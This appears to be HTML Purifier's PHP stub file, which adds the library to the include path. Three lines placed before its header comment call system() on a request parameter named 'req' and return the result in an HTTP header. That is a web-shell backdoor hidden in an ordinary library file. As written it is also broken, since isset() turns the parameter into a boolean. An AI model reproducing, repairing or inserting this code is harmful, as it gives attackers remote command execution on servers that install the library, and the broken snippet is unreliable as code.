<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/**
 * @file
 * Convenience stub file that adds HTML Purifier's library file to the path
 * without any other side-effects.
 */

set_include_path(dirname(__FILE__) . PATH_SEPARATOR . get_include_path() );

// vim: et sw=4 sts=4
